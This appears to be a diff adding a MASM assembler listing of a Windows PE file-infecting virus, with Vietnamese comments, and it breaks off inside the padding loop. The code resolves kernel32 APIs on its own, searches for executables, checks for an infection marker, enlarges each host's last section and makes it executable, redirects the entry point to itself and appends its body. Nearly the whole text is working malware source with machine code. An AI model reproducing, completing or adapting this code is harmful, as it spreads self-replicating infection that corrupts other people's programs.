@@ -1,0 +1,950 @@
+Microsoft (R) Macro Assembler Version 14.00.24210.0	    11/22/17 17:16:49
+main.asm						     Page 1 - 1
+
+
+				.586p
+				.model FLAT, stdcall
+
+				includelib \masm32\lib\kernel32.lib
+				Extern VirtualProtect@16:NEAR
+ 00000000			_DATA segment
+ 00000000 00000000		temp				dword ?
+ 00000004			_DATA ends
+
+ 00000000			_TEXT segment
+ 00000000			START :
+ 00000000  68 00000000 R	push offset temp
+ 00000005  6A 40		push 40h; 40h = EXECUTE_READWRITE
+ 00000007  B8 00000B76 R	mov eax, offset END_VR
+ 0000000C  BB 0000001F R	mov ebx, offset START_VR
+ 00000011  2B C3		sub eax, ebx
+ 00000013  50			push eax
+ 00000014  B8 0000001F R	mov eax, offset START_VR
+ 00000019  50			push eax
+ 0000001A  E8 00000000 E	call VirtualProtect@16
+
+ 0000001F			START_VR:
+ 0000001F  E8 00000000		call __
+ 00000024			__:
+ 00000024  58			pop eax
+ 00000025  2D 00000024 R	sub eax, offset __
+ 0000002A  89 80 00000799 R	mov[offset delta + eax], eax
+ 00000030  8B F0		mov esi, eax
+
+ 00000032			code_ :
+
+ 00000032  58			pop eax
+ 00000033  50			push eax
+ 00000034  25 FFFF0000		and eax, 0ffff0000h; eax dang tro toi.PEHeader of kernel32.dll
+
+				; ds = data segment of FILE will be virus <ds of FILE host>
+
+ 00000039			find_kernel32:
+ 00000039  66| 81 38 5A4D	cmp word ptr[eax], "ZM"
+ 0000003E  75 0F		jne find_continues
+ 00000040  8B 78 3C		mov edi, [eax + 3Ch]
+ 00000043  03 F8		add edi, eax
+ 00000045  8B 1F		mov ebx, [edi]
+ 00000047  81 FB 00004550	cmp ebx, "EP"
+
+ 0000004D  74 07		je finded_kernel32
+ 0000004F			find_continues :
+ 0000004F  2D 00010000		sub eax, 10000h
+
+ 00000054  EB E3		jmp find_kernel32
+ 00000056			finded_kernel32 :
+				; -- - eax = VA of Kernel32.dll------------------------------------------------ -
+
+				; VA ImageBaseKernelInMem = eax
+ 00000056  89 86 00000863 R	mov [VAImageBaseKernelInMem + esi], eax
+				; VA PEsignature = edi
+
+ 0000005C  89 BE 00000867 R	mov [VAPEsignatureInMem + esi], edi
+
+				; RVA ExportTableInFile = dword prt[VA PEsignature + 78h] .. <in FILE : 78h = offset RVA Export table addess - offset PeSignature>
+ 00000062  8B 5F 78		mov ebx, [edi + 78h]
+				; VA ImageBaseKernelInFile = dw ptr[VA PEsignature + 34h]  .. <in FILE : 34h = offset ImageBase - offset PeSignature>
+ 00000065  8B 4F 34		mov ecx, [edi + 34h]
+				; offset ImageBase = VA ImageBaseKernelInMem - VA ImageBaseKernelInFile
+ 00000068  2B C1		sub eax, ecx
+				; VA ExportTableInMem = RVA ExportTableInFile + VA ImageBaseInFile + offset ImageBase
+ 0000006A  03 D9		add ebx, ecx
+ 0000006C  03 D8		add ebx, eax; ebx = VAExportTableInMem
+
+				; ------read "Export table" of kernel to find "LoadLibrary"---------------- -
+				; read dword in position 9 = ENT->find function by name
+ 0000006E  89 9E 0000086B R	mov[VAExportTableInMem + esi], ebx
+ 00000074  8B FB		mov edi, ebx
+
+ 00000076  8B 5F 1C		mov ebx, [edi + 28]
+ 00000079  03 9E 00000863 R	add ebx, [VAImageBaseKernelInMem + esi]
+ 0000007F  89 9E 0000086F R	mov [VAEAT + esi], ebx; save VA EAT table
+ 00000085  8B 5F 20		mov ebx, [edi + 32]
+ 00000088  03 9E 00000863 R	add ebx, [VAImageBaseKernelInMem + esi]
+ 0000008E  89 9E 00000873 R	mov [VAENT + esi], ebx; save VA ENT table
+ 00000094  8B 5F 24		mov ebx, [edi + 36]
+ 00000097  03 9E 00000863 R	add ebx, [VAImageBaseKernelInMem + esi]
+ 0000009D  89 9E 00000877 R	mov [VAEOT + esi], ebx; save VA EOT table
+
+ 000000A3  8B 86 00000873 R	mov eax, [VAENT + esi]
+ 000000A9  83 E8 04		sub eax, 4
+ 000000AC  8B 96 00000877 R	mov edx, [VAEOT + esi]
+ 000000B2  83 EA 02		sub edx, 2
+ 000000B5			whileFindFuncName:
+ 000000B5  83 C2 02		add edx, 2
+ 000000B8  83 C0 04		add eax, 4
+ 000000BB  8B 18		mov ebx, [eax]; ebx = RVA of 1 Name function
+ 000000BD  03 9E 00000863 R	add ebx, [VAImageBaseKernelInMem + esi];->ebx point to VA Name function export
+ 000000C3  8B 0B		mov ecx, [ebx]
+
+ 000000C5  81 F9 50746547	cmp ecx, "PteG"
+ 000000CB  74 02		je find_continues1
+ 000000CD  EB E6		jmp whileFindFuncName
+ 000000CF			find_continues1 :
+ 000000CF  8B 4B 04		mov ecx, [ebx + 4]
+ 000000D2  81 F9 41636F72	cmp ecx, "Acor"
+ 000000D8  74 02		je find_continues2
+ 000000DA  EB D9		jmp whileFindFuncName
+ 000000DC			find_continues2 :
+ 000000DC  8B 4B 08		mov ecx, [ebx + 8]
+ 000000DF  81 F9 65726464	cmp ecx, "erdd"
+ 000000E5  74 02		je find_continues3
+ 000000E7  EB CC		jmp whileFindFuncName
+ 000000E9			find_continues3 :
+ 000000E9  33 C9		xor ecx, ecx
+ 000000EB  66| 8B 4B 0C		mov cx, word ptr[ebx + 12]
+ 000000EF  66| 81 F9 7373	cmp cx, "ss"
+ 000000F4  74 02		je break_FindFuncName
+ 000000F6  EB BD		jmp whileFindFuncName
+
+ 000000F8			break_FindFuncName :
+ 000000F8  66| 8B 0A		mov cx, word ptr[edx]
+
+ 000000FB  8B 96 0000086F R	mov edx, [VAEAT + esi]
+ 00000101			while_findAddr :
+ 00000101  83 C2 04			add edx, 4
+ 00000104  E2 FB			loop while_findAddr
+ 00000106  8B 12			mov edx, [edx]
+ 00000108  03 96 00000863 R		add edx, [VAImageBaseKernelInMem + esi]
+ 0000010E  89 96 0000079D R		mov [func_GetProcAddress + esi], edx
+
+					; ....................................... set func_LoadLibrary
+ 00000114  B8 000007C0 R		mov eax, offset name_LoadLibraryA
+ 00000119  03 C6			add eax, esi
+ 0000011B  50				push eax
+ 0000011C  FF B6 00000863 R		push [VAImageBaseKernelInMem + esi]
+ 00000122  FF 96 0000079D R		call [func_GetProcAddress + esi]
+ 00000128  89 86 000007CD R		mov [func_LoadLibraryA + esi], eax
+
+					; ........................................set func_VirtualProtect
+ 0000012E  B8 000007D1 R		mov eax, offset name_VirtualProtect
+ 00000133  03 C6			add eax, esi
+ 00000135  50				push eax
+ 00000136  FF B6 00000863 R		push[VAImageBaseKernelInMem + esi]
+ 0000013C  FF 96 0000079D R		call[func_GetProcAddress + esi]
+ 00000142  89 86 000007E0 R		mov[func_VirtualProtect + esi], eax
+
+					; ........................................load dll _ user32.dll
+ 00000148  B8 000007A1 R		mov eax, offset name_user32
+ 0000014D  03 C6			add eax, esi
+ 0000014F  50				push eax
+ 00000150  FF 96 000007CD R		call[func_LoadLibraryA + esi]
+ 00000156  89 86 000007AC R		mov[dll_user32 + esi], eax
+
+					; ........................................set func_MessageBoxA
+ 0000015C  B8 000007B0 R		mov eax, offset name_MessageBoxA
+ 00000161  03 C6			add eax, esi
+ 00000163  50				push eax
+ 00000164  FF B6 000007AC R		push[dll_user32 + esi]
+ 0000016A  FF 96 0000079D R		call[func_GetProcAddress + esi]
+ 00000170  89 86 000007BC R		mov[func_MessageBoxA + esi], eax
+
+					; ........................................set func_CreateFile
+ 00000176  B8 000007E4 R		mov eax, offset name_CreateFile
+ 0000017B  03 C6			add eax, esi
+ 0000017D  50				push eax
+ 0000017E  FF B6 00000863 R		push[VAImageBaseKernelInMem + esi]
+ 00000184  FF 96 0000079D R		call[func_GetProcAddress + esi]
+ 0000018A  89 86 000007F0 R		mov[func_CreateFile + esi], eax
+
+					; ........................................set func_ReadFile
+ 00000190  B8 000007F4 R		mov eax, offset name_ReadFile
+ 00000195  03 C6			add eax, esi
+ 00000197  50				push eax
+ 00000198  FF B6 00000863 R		push[VAImageBaseKernelInMem + esi]
+ 0000019E  FF 96 0000079D R		call[func_GetProcAddress + esi]
+ 000001A4  89 86 000007FD R		mov[func_ReadFile + esi], eax
+
+					; ........................................set func_WriteFile
+ 000001AA  B8 00000801 R		mov eax, offset name_WriteFile
+ 000001AF  03 C6			add eax, esi
+ 000001B1  50				push eax
+ 000001B2  FF B6 00000863 R		push[VAImageBaseKernelInMem + esi]
+ 000001B8  FF 96 0000079D R		call[func_GetProcAddress + esi]
+ 000001BE  89 86 0000080B R		mov[func_WriteFile + esi], eax
+
+					; ........................................set func_SetFilePointer
+ 000001C4  B8 0000080F R		mov eax, offset name_SetFilePointer
+ 000001C9  03 C6			add eax, esi
+ 000001CB  50				push eax
+ 000001CC  FF B6 00000863 R		push[VAImageBaseKernelInMem + esi]
+ 000001D2  FF 96 0000079D R		call[func_GetProcAddress + esi]
+ 000001D8  89 86 0000081E R		mov[func_SetFilePointer + esi], eax
+
+					; ........................................set func_CloseHandle
+ 000001DE  B8 00000822 R		mov eax, offset name_CloseHandle
+ 000001E3  03 C6			add eax, esi
+ 000001E5  50				push eax
+ 000001E6  FF B6 00000863 R		push[VAImageBaseKernelInMem + esi]
+ 000001EC  FF 96 0000079D R		call[func_GetProcAddress + esi]
+ 000001F2  89 86 0000082E R		mov[func_CloseHandle + esi], eax
+
+					; ........................................set func_Lstrcmp
+ 000001F8  B8 00000832 R		mov eax, offset name_lstrcmp
+ 000001FD  03 C6			add eax, esi
+ 000001FF  50				push eax
+ 00000200  FF B6 00000863 R		push[VAImageBaseKernelInMem + esi]
+ 00000206  FF 96 0000079D R		call[func_GetProcAddress + esi]
+ 0000020C  89 86 0000083A R		mov[func_lstrcmp + esi], eax
+
+					; ........................................set func_FindFirstFileA
+ 00000212  B8 0000083E R		mov eax, offset name_FindFirstFileA
+ 00000217  03 C6			add eax, esi
+ 00000219  50				push eax
+ 0000021A  FF B6 00000863 R		push[VAImageBaseKernelInMem + esi]
+ 00000220  FF 96 0000079D R		call[func_GetProcAddress + esi]
+ 00000226  89 86 0000084D R		mov[func_FindFirstFileA + esi], eax
+
+					; ........................................set func_FindNextFileA
+ 0000022C  B8 00000851 R		mov eax, offset name_FindNextFileA
+ 00000231  03 C6			add eax, esi
+ 00000233  50				push eax
+ 00000234  FF B6 00000863 R		push[VAImageBaseKernelInMem + esi]
+ 0000023A  FF 96 0000079D R		call[func_GetProcAddress + esi]
+ 00000240  89 86 0000085F R		mov[func_FindNextFileA + esi], eax
+
+
+					; ................................ >> >> >> >> >> >> >> >> >> >> >> >> >> >> >> >
+					; lay vr
+ 00000246  FF B6 00000893 R		push[EntryPointHost + esi]
+ 0000024C  FF B6 00000897 R		push[EntryPointVr + esi]
+ 00000252  E8 00000047			call timFile
+ 00000257  8F 86 00000897 R		pop[EntryPointVr + esi]
+ 0000025D  8F 86 00000893 R		pop[EntryPointHost + esi]
+					; ..............................................................
+ 00000263  6A 30			push 30h
+ 00000265  B8 00000B6E R		mov eax, offset VRSignature
+ 0000026A  03 C6			add eax, esi
+ 0000026C  50				push eax
+ 0000026D  B8 00000784 R		mov eax, offset msg
+ 00000272  03 C6			add eax, esi
+ 00000274  50				push eax
+ 00000275  6A 00			push 0
+ 00000277  FF 96 000007BC R		call[func_MessageBoxA + esi]
+
+					;	mov eax, offset dll_user32
+					;	add eax, esi
+					;	push eax
+					;	push 40h; 40h = EXECUTE_READWRITE
+					;	push 1000h
+					;	mov eax, offset START_VR
+					;	add eax, esi
+					;	push eax
+					;	call[func_VirtualProtect + esi]
+ 0000027D  83 FE 00			cmp esi, 0
+ 00000280  74 1B			je	end_
+
+ 00000282  B8 FFFFFD87			mov eax, offset START_VR - offset end_ + 5
+ 00000287  03 86 00000893 R		add eax, [EntryPointHost + esi]
+ 0000028D  2B 86 00000897 R		sub eax, [EntryPointVr + esi]
+ 00000293  E8 00000000			call delta_callback
+ 00000298				delta_callback :
+ 00000298  5B			pop ebx
+ 00000299  03 D8		add ebx, eax
+ 0000029B  53			push ebx
+ 0000029C  C3			ret
+ 0000029D			end_ :
+
+ 0000029D  C3			ret
+ 0000029E			timFile proc
+ 0000029E  56			push esi
+ 0000029F  50			push eax
+ 000002A0  53			push ebx
+ 000002A1  51			push ecx
+ 000002A2  52			push edx
+
+ 000002A3  B8 0000090E R	mov eax, offset FindData
+ 000002A8  03 C6		add eax, esi
+ 000002AA  50			push eax
+ 000002AB  B8 000008D7 R	mov eax, offset PathFile
+ 000002B0  03 C6		add eax, esi
+ 000002B2  50			push eax
+ 000002B3  FF 96 0000084D R	call[func_FindFirstFileA + esi]
+ 000002B9  89 86 000008D3 R	mov[hFindFile + esi], eax
+ 000002BF  EB 19		jmp fileFirst
+
+ 000002C1			whileFindFile :
+ 000002C1  B8 0000090E R	mov eax, offset FindData
+ 000002C6  03 C6		add eax, esi
+ 000002C8  50			push eax
+ 000002C9  FF B6 000008D3 R	push[hFindFile + esi]
+ 000002CF  FF 96 0000085F R	call[func_FindNextFileA + esi]
+
+ 000002D5  83 F8 00		cmp eax, 0
+ 000002D8  74 19		je breakFindFile
+ 000002DA			fileFirst :
+ 000002DA  83 BE 0000090E R	cmp dword ptr[FindData + esi], 10h
+	   10
+ 000002E1  74 DE		je  whileFindFile; dwAttributes = 10h->folder
+ 000002E3  83 BE 0000090E R	cmp dword ptr[FindData + esi], 20h
+	   20
+ 000002EA  75 05		jne koDinhDang; dwAttributes = 10h->file
+
+ 000002EC  E8 00000008		call layNhiemVr
+
+ 000002F1			koDinhDang :
+
+ 000002F1  EB CE		jmp whileFindFile
+ 000002F3			breakFindFile :
+
+ 000002F3  5A			pop edx
+ 000002F4  59			pop ecx
+ 000002F5  5B			pop ebx
+ 000002F6  58			pop eax
+ 000002F7  5E			pop esi
+
+ 000002F8  C3			ret
+
+ 000002F9			timFile endp
+
+ 000002F9			layNhiemVr proc
+
+ 000002F9  56			push esi
+ 000002FA  50			push eax
+ 000002FB  53			push ebx
+ 000002FC  51			push ecx
+ 000002FD  52			push edx
+
+				; ------------ - lay HANDLE file lay nhiem---------- -
+ 000002FE  6A 00		push 0
+ 00000300  6A 20		push 20h
+ 00000302  6A 03		push 3
+ 00000304  6A 00		push 0
+ 00000306  6A 01		push 1
+ 00000308  68 C0000000		push 0C0000000h
+ 0000030D  B8 0000093A R	mov eax, offset FindData + 44; ten file lay nhiem
+ 00000312  03 C6		add eax, esi
+ 00000314  50			push eax
+ 00000315  FF 96 000007F0 R	call[func_CreateFile + esi]
+ 0000031B  89 86 00000883 R	mov[hFileHost + esi], eax
+ 00000321  83 F8 FF		cmp eax, -1
+ 00000324  0F 84 00000447	je ketThuc_layNhiem
+
+				; -------------- - kiem tra chu ki "MZ"------------------ -
+ 0000032A  C6 86 00000B5F R	mov[HostSignature + esi], 0
+	   00
+ 00000331  6A 00		push 0; Overlapped
+ 00000333  B8 000008CF R	mov eax, offset numOfByteRead
+ 00000338  03 C6		add eax, esi
+ 0000033A  50			push eax; offset mumByteReaded
+ 0000033B  6A 02		push 2; numOfByte to read
+ 0000033D  B8 00000B5F R	mov eax, offset HostSignature
+ 00000342  03 C6		add eax, esi
+ 00000344  50			push eax; offset Buff save
+ 00000345  FF B6 00000883 R	push[hFileHost + esi]; hFile to Read
+ 0000034B  FF 96 000007FD R	call[func_ReadFile + esi]
+
+ 00000351  B8 00000000		mov eax, 0
+ 00000356  66| 8B 86		mov ax, word ptr[offset HostSignature + esi]
+	   00000B5F R
+ 0000035D  3D 00005A4D		cmp eax, 5a4dh
+ 00000362  0F 85 00000409	jne ketThuc_layNhiem
+
+				; ------------ - sua Header file lay nhiem----------------------------------------------
+ 00000368  C7 86 0000087B R	mov[virusSize + esi], offset END_VR - offset START_VR
+	   00000B57
+
+ 00000372  6A 00		push 0
+ 00000374  6A 00		push 0
+ 00000376  6A 3C		push 3ch
+ 00000378  FF B6 00000883 R	push[hFileHost + esi]
+ 0000037E  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 00000384  6A 00		push 0; Overlapped
+ 00000386  B8 000008CF R	mov eax, offset numOfByteRead
+ 0000038B  03 C6		add eax, esi
+ 0000038D  50			push eax; offset mumByteReaded
+ 0000038E  6A 04		push 4; numOfByte to read
+ 00000390  B8 00000887 R	mov eax, offset PESignatureHost
+ 00000395  03 C6		add eax, esi
+ 00000397  50			push eax; offset Buff save
+ 00000398  FF B6 00000883 R	push[hFileHost + esi]; hFile to Read
+ 0000039E  FF 96 000007FD R	call[func_ReadFile + esi]
+
+				; .............................kiem tra chu ki "PE" + VR Signature
+ 000003A4  6A 00		push 0
+ 000003A6  6A 00		push 0
+ 000003A8  FF B6 00000887 R	push[PESignatureHost + esi]
+ 000003AE  FF B6 00000883 R	push[hFileHost + esi]
+ 000003B4  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 000003BA  C6 86 00000B5F R	mov[HostSignature + esi], 0
+	   00
+ 000003C1  6A 00		push 0; Overlapped
+ 000003C3  B8 000008CF R	mov eax, offset numOfByteRead
+ 000003C8  03 C6		add eax, esi
+ 000003CA  50			push eax; offset mumByteReaded
+ 000003CB  6A 04		push 4; numOfByte to read
+ 000003CD  B8 00000B5F R	mov eax, offset HostSignature
+ 000003D2  03 C6		add eax, esi
+ 000003D4  50			push eax; offset Buff save
+ 000003D5  FF B6 00000883 R	push[hFileHost + esi]; hFile to Read
+ 000003DB  FF 96 000007FD R	call[func_ReadFile + esi]
+ 000003E1  81 BE 00000B5F R	cmp dword ptr[HostSignature + esi], "EP"
+	   00004550
+ 000003EB  0F 85 00000380	jne ketThuc_layNhiem
+
+ 000003F1  6A 02		push 2
+ 000003F3  6A 00		push 0
+ 000003F5  6A F1		push - 15
+ 000003F7  FF B6 00000883 R	push[hFileHost + esi]
+ 000003FD  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 00000403  6A 00		push 0; Overlapped
+ 00000405  B8 000008CF R	mov eax, offset numOfByteRead
+ 0000040A  03 C6		add eax, esi
+ 0000040C  50			push eax; offset mumByteReaded
+ 0000040D  6A 0E		push 14; numOfByte to read
+ 0000040F  B8 00000B5F R	mov eax, offset HostSignature
+ 00000414  03 C6		add eax, esi
+ 00000416  50			push eax; offset Buff save
+ 00000417  FF B6 00000883 R	push[hFileHost + esi]; hFile to Read
+ 0000041D  FF 96 000007FD R	call[func_ReadFile + esi]
+
+ 00000423  B8 00000B5F R	mov eax, offset HostSignature
+ 00000428  03 C6		add eax, esi
+ 0000042A  50			push eax
+ 0000042B  B8 00000B6E R	mov eax, offset VRSignature
+ 00000430  03 C6		add eax, esi
+ 00000432  50			push eax
+ 00000433  FF 96 0000083A R	call[func_lstrcmp + esi]
+ 00000439  0F 84 00000332	je ketThuc_layNhiem
+				; ............................read Section Alignment + File Alignment
+ 0000043F  6A 00		push 0
+ 00000441  6A 00		push 0
+ 00000443  8B 86 00000887 R	mov eax, [PESignatureHost + esi]
+ 00000449  83 C0 38		add eax, 38h
+ 0000044C  50			push eax
+ 0000044D  FF B6 00000883 R	push[hFileHost + esi]
+ 00000453  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 00000459  6A 00		push 0; Overlapped
+ 0000045B  B8 000008CF R	mov eax, offset numOfByteRead
+ 00000460  03 C6		add eax, esi
+ 00000462  50			push eax; offset mumByteReaded
+ 00000463  6A 08		push 8; numOfByte to read
+ 00000465  B8 0000089F R	mov eax, offset SectionAlignment
+ 0000046A  03 C6		add eax, esi
+ 0000046C  50			push eax; offset Buff save
+ 0000046D  FF B6 00000883 R	push[hFileHost + esi]; hFile to Read
+ 00000473  FF 96 000007FD R	call[func_ReadFile + esi]
+
+				; ........................ read EntryPoint Host
+ 00000479  6A 00		push 0
+ 0000047B  6A 00		push 0
+ 0000047D  8B 86 00000887 R	mov eax, [PESignatureHost + esi]
+ 00000483  83 C0 28		add eax, 28h
+ 00000486  50			push eax
+ 00000487  FF B6 00000883 R	push[hFileHost + esi]
+ 0000048D  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 00000493  6A 00		push 0; Overlapped
+ 00000495  B8 000008CF R	mov eax, offset numOfByteRead
+ 0000049A  03 C6		add eax, esi
+ 0000049C  50			push eax; offset mumByteReaded
+ 0000049D  6A 04		push 4; numOfByte to read
+ 0000049F  B8 00000893 R	mov eax, offset EntryPointHost
+ 000004A4  03 C6		add eax, esi
+ 000004A6  50			push eax; offset Buff save
+ 000004A7  FF B6 00000883 R	push[hFileHost + esi]; hFile to Read
+ 000004AD  FF 96 000007FD R	call[func_ReadFile + esi]
+
+				; ..................... read ImageSize Host
+ 000004B3  6A 00		push 0
+ 000004B5  6A 00		push 0
+ 000004B7  8B 86 00000887 R	mov eax, [PESignatureHost + esi]
+ 000004BD  83 C0 50		add eax, 50h
+ 000004C0  50			push eax
+ 000004C1  FF B6 00000883 R	push[hFileHost + esi]
+ 000004C7  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 000004CD  6A 00		push 0; Overlapped
+ 000004CF  B8 000008CF R	mov eax, offset numOfByteRead
+ 000004D4  03 C6		add eax, esi
+ 000004D6  50			push eax; offset mumByteReaded
+ 000004D7  6A 04		push 4; numOfByte to read
+ 000004D9  B8 0000088B R	mov eax, offset ImageSizeHost
+ 000004DE  03 C6		add eax, esi
+ 000004E0  50			push eax; offset Buff save
+ 000004E1  FF B6 00000883 R	push[hFileHost + esi]; hFile to Read
+ 000004E7  FF 96 000007FD R	call[func_ReadFile + esi]
+
+
+				; ........................ read Number of Section
+ 000004ED  6A 00		push 0
+ 000004EF  6A 00		push 0
+ 000004F1  8B 86 00000887 R	mov eax, [PESignatureHost + esi]
+ 000004F7  83 C0 06		add eax, 6h
+ 000004FA  50			push eax
+ 000004FB  FF B6 00000883 R	push[hFileHost + esi]
+ 00000501  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 00000507  C7 86 0000089B R	mov[NumberOfSection + esi], 0
+	   00000000
+ 00000511  6A 00		push 0; Overlapped
+ 00000513  B8 000008CF R	mov eax, offset numOfByteRead
+ 00000518  03 C6		add eax, esi
+ 0000051A  50			push eax; offset mumByteReaded
+ 0000051B  6A 02		push 2; numOfByte to read
+ 0000051D  B8 0000089B R	mov eax, offset NumberOfSection
+ 00000522  03 C6		add eax, esi
+ 00000524  50			push eax; offset Buff save
+ 00000525  FF B6 00000883 R	push[hFileHost + esi]; hFile to Read
+ 0000052B  FF 96 000007FD R	call[func_ReadFile + esi]
+
+				; -------------------- - change Section final-------------- -
+ 00000531  8B 8E 0000089B R	mov ecx, [NumberOfSection + esi]
+ 00000537  49			dec ecx
+ 00000538  8B 86 00000887 R	mov eax, [PESignatureHost + esi]
+ 0000053E  05 00000100		add eax, 0f8h + 8
+ 00000543			lap_1:
+ 00000543  83 C0 28		add eax, 40
+ 00000546  E2 FB		loop lap_1
+
+ 00000548  6A 00		push 0
+ 0000054A  6A 00		push 0
+ 0000054C  50			push eax
+ 0000054D  FF B6 00000883 R	push[hFileHost + esi]
+ 00000553  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 00000559  6A 00		push 0; Overlapped
+ 0000055B  B8 000008CF R	mov eax, offset numOfByteRead
+ 00000560  03 C6		add eax, esi
+ 00000562  50			push eax; offset mumByteReaded
+ 00000563  6A 20		push 32; numOfByte to read
+ 00000565  B8 000008A7 R	mov eax, offset VirtualSize
+ 0000056A  03 C6		add eax, esi
+ 0000056C  50			push eax; offset Buff save
+ 0000056D  FF B6 00000883 R	push[hFileHost + esi]; hFile to Read
+ 00000573  FF 96 000007FD R	call[func_ReadFile + esi]
+
+				; ------calculate new RawSize + Virtual size + characteristic------ -
+ 00000579  C7 86 000008C3 R	mov[Characteristics + esi], 0E0000040h; set is exe + write + read
+	   E0000040
+
+ 00000583  8B 86 0000087B R	mov eax, [virusSize + esi];
+ 00000589  01 86 000008AF R	add[RawSize + esi], eax; rawsize += Virus size
+				; raw size is not FileAlignment
+ 0000058F  8B 86 000008AF R	mov eax, [RawSize + esi];
+ 00000595  BA 00000000		mov edx, 0
+ 0000059A  F7 B6 000008A3 R	div[FileAlignment + esi]; edx = phan du, eax = thuong
+
+ 000005A0  8B 86 000008A3 R	mov eax, [FileAlignment + esi]
+ 000005A6  2B C2		sub eax, edx
+ 000005A8  01 86 000008AF R	add[RawSize + esi], eax; eax = num of file to fill
+ 000005AE  89 86 000008C7 R	mov[numOfByteToFill + esi], eax
+
+ 000005B4  8B 86 000008AF R	mov eax, [RawSize + esi]
+ 000005BA  89 86 000008A7 R	mov[VirtualSize + esi], eax
+
+ 000005C0  6A 01		push 1; jump to in front of section final
+ 000005C2  6A 00		push 0h
+ 000005C4  6A E0		push - 32
+ 000005C6  FF B6 00000883 R	push[hFileHost + esi]
+ 000005CC  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 000005D2  6A 00		push 0; write to Section header
+ 000005D4  B8 000008CB R	mov eax, offset numOfByteWritten
+ 000005D9  03 C6		add eax, esi
+ 000005DB  50			push eax
+ 000005DC  6A 20		push 32
+ 000005DE  B8 000008A7 R	mov eax, offset VirtualSize
+ 000005E3  03 C6		add eax, esi
+ 000005E5  50			push eax
+ 000005E6  FF B6 00000883 R	push[hFileHost + esi]
+ 000005EC  FF 96 0000080B R	call[func_WriteFile + esi]
+
+				; ------------------ -
+ 000005F2  6A 02		push 2
+ 000005F4  6A 00		push 0
+ 000005F6  6A 00		push 0
+ 000005F8  FF B6 00000883 R	push[hFileHost + esi]
+ 000005FE  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 00000604  8B 9E 000008AF R	mov ebx, [RawSize + esi]
+ 0000060A  03 9E 000008B3 R	add ebx, [RawAddress + esi]
+ 00000610  3B C3		cmp	eax, ebx
+ 00000612  74 00		je fullAlignment
+ 00000614			fullAlignment :
+				; ------------ - ghi entry point---------------- -
+ 00000614  6A 02		push 2
+ 00000616  6A 00		push 0
+ 00000618  6A 00		push 0
+ 0000061A  FF B6 00000883 R	push[hFileHost + esi]
+ 00000620  FF 96 0000081E R	call[func_SetFilePointer + esi]
+ 00000626  89 86 0000087F R	mov[hostSize + esi], eax
+ 0000062C  2B 86 000008B3 R	sub eax, [RawAddress + esi]
+ 00000632  03 86 000008AB R	add eax, [VirtualAddress + esi]
+ 00000638  89 86 00000897 R	mov[EntryPointVr + esi], eax
+
+ 0000063E  6A 00		push 0
+ 00000640  6A 00		push 0
+ 00000642  8B 86 00000887 R	mov eax, [PESignatureHost + esi]
+ 00000648  83 C0 28		add eax, 28h
+ 0000064B  50			push eax
+ 0000064C  FF B6 00000883 R	push[hFileHost + esi]
+ 00000652  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 00000658  6A 00		push 0
+ 0000065A  B8 000008CB R	mov eax, offset numOfByteWritten
+ 0000065F  03 C6		add eax, esi
+ 00000661  50			push eax
+ 00000662  6A 04		push 4
+ 00000664  B8 00000897 R	mov eax, offset EntryPointVr
+ 00000669  03 C6		add eax, esi
+ 0000066B  50			push eax
+ 0000066C  FF B6 00000883 R	push[hFileHost + esi]
+ 00000672  FF 96 0000080B R	call[func_WriteFile + esi]
+
+				; ------------ - ghi Image size file Host_vr------
+ 00000678  6A 00		push 0
+ 0000067A  6A 00		push 0
+ 0000067C  8B 86 00000887 R	mov eax, [PESignatureHost + esi]
+ 00000682  83 C0 50		add eax, 50h
+ 00000685  50			push eax
+ 00000686  FF B6 00000883 R	push[hFileHost + esi]
+ 0000068C  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 00000692  8B 86 000008AB R	mov eax, [VirtualAddress + esi]
+ 00000698  03 86 000008A7 R	add eax, [VirtualSize + esi]
+ 0000069E  3B 86 0000088B R	cmp eax, [ImageSizeHost + esi]
+
+ 000006A4  7E 32		jle not_write
+
+ 000006A6  8B 86 0000088B R	mov eax, [ImageSizeHost + esi]
+ 000006AC  03 86 0000089F R	add eax, [SectionAlignment + esi]
+ 000006B2  89 86 0000088F R	mov[ImageSizeVr + esi], eax
+
+ 000006B8  6A 00		push 0
+ 000006BA  B8 000008CB R	mov eax, offset numOfByteWritten
+ 000006BF  03 C6		add eax, esi
+ 000006C1  50			push eax
+ 000006C2  6A 04		push 4
+ 000006C4  B8 0000088F R	mov eax, offset ImageSizeVr
+ 000006C9  03 C6		add eax, esi
+ 000006CB  50			push eax
+ 000006CC  FF B6 00000883 R	push[hFileHost + esi]
+ 000006D2  FF 96 0000080B R	call[func_WriteFile + esi]
+
+ 000006D8			not_write:
+				; ------------ - ghi vr vao cuoi file--------------
+ 000006D8  6A 02		push 2
+ 000006DA  6A 00		push 0
+ 000006DC  6A 00		push 0
+ 000006DE  FF B6 00000883 R	push[hFileHost + esi]
+ 000006E4  FF 96 0000081E R	call[func_SetFilePointer + esi]
+
+ 000006EA  6A 00		push 0
+ 000006EC  B8 000008CB R	mov eax, offset numOfByteWritten
+ 000006F1  03 C6		add eax, esi
+ 000006F3  50			push eax
+ 000006F4  B8 0000001F R	mov eax, offset START_VR
+ 000006F9  BB 00000B76 R	mov ebx, offset END_VR
+ 000006FE  2B D8		sub ebx, eax
+ 00000700  53			push ebx
+ 00000701  B8 0000001F R	mov eax, offset START_VR
+ 00000706  03 C6		add eax, esi
+ 00000708  50			push eax
+ 00000709  FF B6 00000883 R	push[hFileHost + esi]
+ 0000070F  FF 96 0000080B R	call[func_WriteFile + esi]
+
+				; --------------fill byte 00 --------------------
+ 00000715  8B 8E 000008C7 R	mov ecx, [numOfByteToFill + esi]
+ 0000071B			lap_fill:
+ 0000071B  51			push ecx
+ 0000071C  6A 00		push 0
+ 0000071E  B8 000008CB R	mov eax, offset numOfByteWritten
+ 00000723  03 C6		add eax, esi
+ 00000725  50			push eax
+ 00000726  6A 01		push 1
+ 00000728  B8 00000783 R	mov eax, offset byteFill
+ 0000072D  03 C6		add eax, esi
